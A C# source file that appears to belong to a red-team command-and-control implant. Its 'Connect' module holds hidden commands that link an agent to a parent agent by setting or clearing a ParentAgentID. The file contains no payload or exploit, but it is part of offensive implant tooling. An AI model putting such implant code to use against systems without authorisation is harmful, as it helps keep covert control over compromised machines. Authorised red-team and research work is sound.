using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Common.Models;

using System.Collections.Generic;
using System.Text;

namespace Agent.Modules
{
    class ConnectModule : IAgentModule
    {
        private AgentController Agent { get; set; }
        private ConfigController Config { get; set; }

        public AgentModule GetModuleInfo()
        {
            return new AgentModule
            {
                Name = "Connect",
                Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Adam Chester", Handle = "@_xpn_" }
                },
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "connect",
                        Visible = false,
                        CallBack = HandleIncomingConnect
                    },
                    new AgentCommand
                    {
                        Name = "disconnect",
                        Visible = false,
                        CallBack = HandleIncommingDisconnect
                    }
                },
                NotifyTeamServer = false
            };
        }

        private void HandleIncommingDisconnect(byte[] data)
        {
            var metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata;
            metadata.ParentAgentID = string.Empty;

            Config.SetOption(ConfigSetting.Metadata, metadata);
        }

        private void HandleIncomingConnect(byte[] data)
        {
            var metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata;
            metadata.ParentAgentID = Encoding.UTF8.GetString(data);

            Config.SetOption(ConfigSetting.Metadata, metadata);

            Agent.RegisterAgentModule(new CoreAgentModule());
        }

        public void Init(AgentController agentController, ConfigController configController)
        {
            Agent = agentController;
            Config = configController;
        }
    }
}